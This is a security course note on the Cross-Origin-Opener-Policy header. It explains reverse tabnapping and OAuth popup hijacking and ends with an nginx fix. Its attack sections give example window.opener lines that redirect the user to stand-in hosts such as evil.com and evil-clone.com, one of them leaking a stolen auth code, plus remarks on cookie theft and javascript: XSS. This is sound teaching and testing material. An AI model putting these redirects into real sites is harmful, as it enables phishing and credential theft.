---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.58 Cross-Origin-Opener-Policy (COOP)"
---

# 03.58 — Cross-Origin-Opener-Policy (COOP)

## What is it?

`Cross-Origin-Opener-Policy` (COOP) controls whether a window can interact with cross-origin popups it opens. Without COOP, a cross-origin page opened by `window.open()` maintains a reference to the opener — enabling cross-origin attacks.

---

## Values

```
Cross-Origin-Opener-Policy: unsafe-none          → default; opener kept
Cross-Origin-Opener-Policy: same-origin-allow-popups  → only same-origin popups share opener
Cross-Origin-Opener-Policy: same-origin          → no cross-origin opener access at all
```

---

## Attack: Missing COOP — window.opener Abuse

```
WITHOUT COOP:
  SCENARIO: Your app opens a cross-origin payment page via window.open().
  
  Payment page (evil or compromised):
    window.opener.location = 'https://evil.com/phishing'
    → Redirects the OPENER (your app!) to phishing page!
    → User thinks they're on bank.com → actually evil.com!
    
  This is a "reverse tabnapping" attack!

ALSO:
  Your app:  window.open('https://partner.com')
  partner.com:
    window.opener.document.cookie  ← tries to steal cookies!
    window.opener.location = 'javascript:...'  ← tries XSS!
```

---

## Attack: OAuth Flow Hijacking via window.opener

```
OAUTH POPUP FLOW:
  App opens OAuth popup: window.open('https://oauth-provider.com/auth')
  After auth, OAuth provider closes popup (or redirects back).
  
  ATTACK: Malicious OAuth provider:
    window.opener.location = 'https://evil-clone.com/?code=STOLEN_CODE'
    → Redirects user's main window!
    → Auth code leaked to attacker!
    
  REQUIRES: App uses popup-based OAuth AND no COOP!
```

---

## COOP and Cross-Origin Isolation

```
For SharedArrayBuffer (Spectre mitigation):
  Both COOP AND COEP required:
  
  COOP: same-origin       → isolate from cross-origin windows
  COEP: require-corp      → isolate from cross-origin resources
  
  → "Cross-origin isolated" → browser allows SharedArrayBuffer safely!
```

---

## Testing

```bash
# Check COOP:
curl -sI https://target.com | grep -i "cross-origin-opener-policy"
# Missing → window.opener abuse possible!

# Test in browser:
# 1. Open target app
# 2. Run: var w = window.open('https://target.com')
# 3. Try from popup: window.opener.location = 'https://attacker.com'
# 4. Does main window redirect? → COOP missing!
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| window.opener abuse | Set `COOP: same-origin` |
| OAuth popup hijacking | Set `COOP: same-origin` on OAuth callback pages |

**Quick fix:**
```nginx
add_header Cross-Origin-Opener-Policy "same-origin" always;
```

---

## Related Notes
- [[57 - Cross-Origin-Embedder-Policy]] — COEP (cross-origin isolation partner)
- [[59 - Cross-Origin-Resource-Policy]] — CORP
- [[Module 08 - CORS]] — related cross-origin policies
